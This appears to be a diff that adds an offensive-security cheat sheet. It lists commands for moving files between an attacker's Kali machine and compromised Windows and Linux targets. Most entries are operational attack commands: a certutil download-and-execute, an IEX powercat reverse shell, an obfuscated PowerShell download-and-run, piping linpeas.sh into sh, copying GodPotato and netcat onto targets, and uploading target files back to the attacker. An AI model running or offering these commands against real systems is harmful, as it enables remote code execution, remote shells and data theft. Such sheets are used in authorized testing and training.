@@ -1,0 +1,39 @@
+^File Transfer notes: use ports like 443, 53, or 80 as LPORT to bypass firewalls
+SCP File Download:scp -P <port> <filename1> <user>@<target>:/tmp/ # upload file to target over SCP (Kali → Remote); kali-machine
+SCP File Download:scp -P 22 <filename1> kali@<kali>:/home/kali/ # transfer file from target to Kali (Remote → Kali) over SSH (ensure SSH is running on Kali: sudo systemctl start ssh); target-machine
+SCP File Download:scp -P 22 <user>@<target>:/tmp/output.txt /home/kali/share/results/ #securely copy file from remote host to Kali (Remote → Kali) over SSH on custom port 22; kali-machine
+certutil:certutil.exe -f -urlcache -split http://<kali>:<kaliPort>/<filename1> c:\windows\temp\<filename1> && cmd.exe /c c:\windows\temp\<filename1> # download and execute payload via certutil; target-machine
+iwr:iwr -uri http://<kali>:<kaliPort>/<filename1> -Outfile <filename1> # download and save with Invoke-WebRequest; target-machine
+pwsh:IEX (New-Object System.Net.Webclient).DownloadString("http://<kali>:<kaliPort>/powercat.ps1");powercat -c <kali> -p 4444 -e powershell # Powercat; target-machine
+pwsh:powershell wget http://<kali>:<kaliPort>/<filename1> -o .\<filename1> # target-machine
+pwsh:IEX+(New-Object+System.Net.WebClient).DownloadFile("http%3a//<kali>/update.exe",+"$env%3atemp\update.exe")%3b+Start-Process+"$env%3atemp\update.exe" # Obfuscated download and execute .exe via PowerShell; target-machine
+SMB File Transfer from target to kali:impacket-smbserver -smb2support share . # kali-machine
+SMB File Transfer from target to kali:impacket-smbserver share . -smb2support -username user1 -password Passw0rd! # kali-machine
+SMB File Transfer from target to kali:net use \\<kali>\share /user:user1 Passw0rd! # target-machine
+SMB File Transfer from target to kali:copy <filename1> \\<kali>\share\ # target-machine
+SMB File Transfer from target to kali:powershell.exe "copy //<kali>/share/GodPotato-NET4.exe C:/Windows/Temp/GodPotato-NET4.exe" # target-machine
+SMB File Transfer from target to kali:powershell.exe "copy //<kali>/share/nc64.exe C:/Windows/Temp/nc64.exe" # target-machine
+SMB File Transfer from target to target via Powershell:icacls $PWD /grant 'Everyone:(OI)(CI)RX' /T | Out-Null; New-SmbShare -Name 'MyShare' -Path $PWD -ReadAccess 'Everyone' # target1; target-machine
+SMB File Transfer from target to target via cmd.exe:icacls "%cd%" /grant Everyone:(OI)(CI)RX /T && net share MyShare="%cd%" /GRANT:Everyone,READ # target1; target-machine
+SMB File Transfer from target to target via cmd.exe:icacls ".\<filename>" /grant Everyone:R # target1; target-machine
+SMB File Transfer from target to target via cmd.exe:net use Z: \\<target>\share # target2; target-machine
+SMB File Transfer from target to target via cmd.exe:copy Z:\prts64.exe C:\Users\Public\prts64.exe # target-machine
+Grant “Everyone” Read & Execute rights on current directory:icacls "." /grant Everyone:RX # target-machine
+http server from target machine:$folder=Get-Location; $port=<port>; $listener=New-Object System.Net.HttpListener; $listener.Prefixes.Add("http://*:$port/"); $listener.Start(); Write-Host "Serving $folder on port $port"; while($listener.IsListening){$ctx=$listener.GetContext(); $req=$ctx.Request; $res=$ctx.Response; $path=Join-Path $folder ($req.Url.LocalPath.TrimStart('/').Replace('/','\')); if(Test-Path $path){$bytes=[IO.File]::ReadAllBytes($path); $res.ContentType='application/octet-stream'; $res.ContentLength64=$bytes.Length; $res.OutputStream.Write($bytes,0,$bytes.Length)}else{$res.StatusCode=404}; $res.OutputStream.Close()} # fragile; target-machine
+Base64 transfer:base64 <filename1> > <filename2> # kali-machine
+Base64 transfer:base64 -d <filename2> > <filename1> # target-machine
+curl:curl --path-as-is -i -s -k -X $'POST' \ # kali-machine
+curl:curl -k -i --path-as-is # kali-machine
+curl:curl -k -vv --path-as-is # kali-machine
+curl:curl -s -O http://<target>:<port>/<filename1> # download file with curl; kali-machine
+curl:curl http://<kali>:<kaliPort>/linpeas.sh | sh # Victim # target-machine
+smbclient $>:mask "" # disable filename mask; kali-machine
+smbclient $>:recurse ON # enable recursive download; kali-machine
+smbclient $>:prompt OFF # disable prompts; kali-machine
+smbclient $>:cd <remote_path> # change remote directory; kali-machine
+smbclient $>:lcd <local_path> # change local directory; kali-machine
+smbclient $>:mget * # download all files; kali-machine
+Python File Upload from target to kali:https://gist.github.com/UniIsland/3346170
+Python File Upload from target to kali:python simpleHTTPServerWithUpload.py <kaliPort> #kali-machine
+Python File Upload from target to kali:powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://<kali>:<kaliPort>/', '<file location>')" #target-machine
+Python File Upload from target to kali:curl.exe -X POST http://<kali>:8008/upload -F "files=@<file location> #target-machine
